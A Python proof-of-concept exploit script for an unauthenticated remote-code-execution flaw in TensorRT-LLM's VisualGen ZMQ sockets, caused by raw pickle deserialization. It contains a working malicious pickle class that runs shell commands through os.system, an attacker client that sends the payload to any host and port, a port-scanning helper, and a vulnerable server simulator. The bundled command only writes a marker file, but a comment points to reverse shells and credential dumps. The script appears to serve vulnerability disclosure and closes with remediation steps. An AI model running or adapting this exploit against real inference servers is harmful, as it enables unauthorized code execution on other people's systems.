# SPDX-FileCopyrightText: Copyright (c) 2024-2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# PoC-003: Remote Code Execution via Unauthenticated ZMQ Pickle Deserialization
#
# Vulnerabilities:
#   File 1: tensorrt_llm/llmapi/visual_gen.py:70-71
#     self.request_queue_addr  = f"tcp://0.0.0.0:{req_port}"   <- binds to ALL interfaces
#     self.response_queue_addr = f"tcp://0.0.0.0:{resp_port}"  <- binds to ALL interfaces
#     use_hmac_encryption=False                                  <- no authentication
#
#   File 2: tensorrt_llm/executor/ipc.py:367
#     return pickle.loads(data)  # nosec B301                   <- unchecked deserialize
#
#   File 3: tensorrt_llm/_torch/visual_gen/executor.py:94
#     use_hmac_encryption=False                                  <- worker also unprotected
#
# Impact: CRITICAL - Unauthenticated Remote Code Execution
# CWE-502: Deserialization of Untrusted Data
# CWE-1327: Binding to an Unrestricted IP Address
#
# Attack Scenario:
#   When VisualGen (diffusion image generation) is running, it opens two TCP ZMQ sockets
#   bound to 0.0.0.0 (all interfaces) on ephemeral ports with HMAC disabled.
#   Any host reachable on the network can connect and send a malicious pickle payload
#   that executes arbitrary code in the TensorRT-LLM server process.
#
#   On a multi-tenant GPU cluster or cloud environment (e.g. AWS, GCP) where the
#   inference server is accessible from other tenant VMs, this is trivially exploitable.
#
# Prerequisites:
#   pip install pyzmq  (already a TensorRT-LLM dependency)
#
# Usage (requires ZMQ sockets to be open on target):
#   # Terminal 1 - Start a fake "victim" server exposing the vulnerable socket
#   python security/pocs/poc_003_zmq_unauthenticated_pickle_rce.py --mode server
#
#   # Terminal 2 - Run the attacker payload
#   python security/pocs/poc_003_zmq_unauthenticated_pickle_rce.py --mode attack --port <PORT>
#
# Safe demo mode (self-contained, no network required):
#   python security/pocs/poc_003_zmq_unauthenticated_pickle_rce.py --mode demo

import argparse
import os
import pickle
import socket
import sys
import threading
import time


# --------------------------------------------------------------------------- #
# Malicious pickle payload                                                     #
# --------------------------------------------------------------------------- #

MARKER_FILE = "/tmp/poc_003_pwned.txt"


class MaliciousPickle:
    """
    A Python object whose __reduce__ method causes arbitrary code to execute
    when unpickled.  Safe demonstration: writes a marker file.
    """
    def __reduce__(self):
        # In a real attack: reverse shell, credential dump, etc.
        cmd = f"echo POC_003_ZMQ_RCE_$(id) > {MARKER_FILE}"
        return (os.system, (cmd,))


def build_malicious_payload() -> bytes:
    """Serialize the malicious object into a pickle blob."""
    return pickle.dumps(MaliciousPickle())


# --------------------------------------------------------------------------- #
# Vulnerable server (mirrors visual_gen.py behaviour)                          #
# --------------------------------------------------------------------------- #

def run_vulnerable_server(bind_addr: str = "tcp://0.0.0.0:0"):
    """
    Simulates the vulnerable ZeroMqQueue in visual_gen.py:
      - Binds to 0.0.0.0 (all interfaces)
      - use_hmac_encryption=False  =>  raw pickle.loads() on receive
    """
    try:
        import zmq
    except ImportError:
        print("[-] pyzmq not installed. Install with: pip install pyzmq")
        sys.exit(1)

    ctx = zmq.Context()
    sock = ctx.socket(zmq.PULL)
    sock.bind(bind_addr)
    actual_endpoint = sock.getsockopt(zmq.LAST_ENDPOINT).decode()
    port = actual_endpoint.rsplit(":", 1)[-1]

    print(f"[server] Vulnerable ZMQ PULL socket bound to: {actual_endpoint}")
    print(f"[server] Port: {port}  (HMAC disabled, raw pickle deserialisation)")
    print(f"[server] Waiting for messages…")

    # Signal the port number so the attacker can connect
    # (in production this port is discoverable via netstat / /proc/net/tcp)
    port_file = "/tmp/poc_003_server_port.txt"
    with open(port_file, "w") as f:
        f.write(port)

    try:
        while True:
            raw = sock.recv()
            print(f"[server] Received {len(raw)} bytes — deserialising with pickle.loads()…")
            # VULNERABLE LINE — mirrors ipc.py:367
            obj = pickle.loads(raw)  # noqa: S301
            print(f"[server] Deserialised object: {obj!r}")
    except KeyboardInterrupt:
        print("[server] Shutting down.")
    finally:
        sock.close()
        ctx.term()
        if os.path.exists(port_file):
            os.remove(port_file)


# --------------------------------------------------------------------------- #
# Attacker client                                                               #
# --------------------------------------------------------------------------- #

def run_attacker(target_host: str, target_port: int):
    """
    Connects to the unauthenticated ZMQ socket and sends a malicious pickle.
    No credentials required — the server accepts any bytes from any peer.
    """
    try:
        import zmq
    except ImportError:
        print("[-] pyzmq not installed. Install with: pip install pyzmq")
        sys.exit(1)

    payload = build_malicious_payload()
    target = f"tcp://{target_host}:{target_port}"

    print(f"[attacker] Connecting to {target}")
    ctx = zmq.Context()
    sock = ctx.socket(zmq.PUSH)
    sock.connect(target)
    time.sleep(0.3)  # Let ZMQ complete the handshake

    print(f"[attacker] Sending {len(payload)}-byte malicious pickle payload…")
    sock.send(payload)
    time.sleep(0.3)

    sock.close()
    ctx.term()
    print("[attacker] Payload sent.")


# --------------------------------------------------------------------------- #
# Self-contained demo (no network needed)                                       #
# --------------------------------------------------------------------------- #

def run_demo():
    """
    Demonstrates the vulnerability in a single process without real networking.
    Mirrors the exact code path in tensorrt_llm/executor/ipc.py:367.
    """
    print("=" * 60)
    print("PoC-003: ZMQ Unauthenticated Pickle RCE — self-contained demo")
    print("=" * 60)

    # Remove marker from previous run
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)

    payload = build_malicious_payload()
    print(f"[*] Built {len(payload)}-byte pickle payload")

    # Mirrors the code path in tensorrt_llm/executor/ipc.py:367
    # (the path taken when use_hmac_encryption=False)
    print("[*] Calling pickle.loads(payload) — this is what the server does")
    pickle.loads(payload)  # noqa: S301

    if os.path.exists(MARKER_FILE):
        with open(MARKER_FILE) as fh:
            contents = fh.read().strip()
        print(f"\n[!] VULNERABLE: Code executed on deserialisation")
        print(f"[+] Marker file: {MARKER_FILE}")
        print(f"[+] Contents:    {contents}")
    else:
        print("[-] Marker file not written — check os.system availability")

    print("\n--- Relevant code locations ---")
    print("visual_gen.py:70  : self.request_queue_addr = f'tcp://0.0.0.0:{req_port}'")
    print("visual_gen.py:197 : use_hmac_encryption=False")
    print("ipc.py:367        : return pickle.loads(data)  # nosec B301")

    print("\n--- Remediation ---")
    print("1. Bind to 127.0.0.1 instead of 0.0.0.0:")
    print("   self.request_queue_addr = f'tcp://127.0.0.1:{req_port}'")
    print("2. Always enable HMAC: use_hmac_encryption=True")
    print("3. Replace pickle with a safe serialisation format (msgpack, protobuf)")


# --------------------------------------------------------------------------- #
# Network scan helper (shows how an attacker discovers the port)               #
# --------------------------------------------------------------------------- #

def scan_for_zmq_ports(target_host: str, port_range: range):
    """
    Demonstrates how trivially an attacker can find the exposed ZMQ ports.
    ZMQ sockets do not require a handshake for connection, so a simple TCP
    connect probe is sufficient.
    """
    print(f"[scanner] Scanning {target_host} for open TCP ports in {port_range}…")
    open_ports = []
    for port in port_range:
        try:
            with socket.create_connection((target_host, port), timeout=0.1):
                open_ports.append(port)
        except (ConnectionRefusedError, TimeoutError, OSError):
            pass
    print(f"[scanner] Open ports: {open_ports}")
    return open_ports


# --------------------------------------------------------------------------- #
# Entry point                                                                   #
# --------------------------------------------------------------------------- #

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PoC-003: ZMQ unauthenticated pickle RCE demonstration")
    parser.add_argument(
        "--mode", choices=["demo", "server", "attack"],
        default="demo",
        help="demo=self-contained test; server=start vulnerable listener; "
             "attack=send payload to running server")
    parser.add_argument("--host", default="127.0.0.1",
                        help="Target host (attack mode)")
    parser.add_argument("--port", type=int, default=0,
                        help="Target port (attack mode); 0=read from /tmp/poc_003_server_port.txt")
    args = parser.parse_args()

    if args.mode == "demo":
        run_demo()

    elif args.mode == "server":
        run_vulnerable_server()

    elif args.mode == "attack":
        port = args.port
        if port == 0:
            port_file = "/tmp/poc_003_server_port.txt"
            if not os.path.exists(port_file):
                print(f"[-] Port file {port_file} not found. "
                      "Start the server first or specify --port explicitly.")
                sys.exit(1)
            with open(port_file) as fh:
                port = int(fh.read().strip())
        run_attacker(args.host, port)
        time.sleep(0.5)
        if os.path.exists(MARKER_FILE):
            with open(MARKER_FILE) as fh:
                print(f"\n[!] RCE CONFIRMED — marker file: {fh.read().strip()}")
        else:
            print("[*] Payload sent; check server terminal for execution confirmation.")
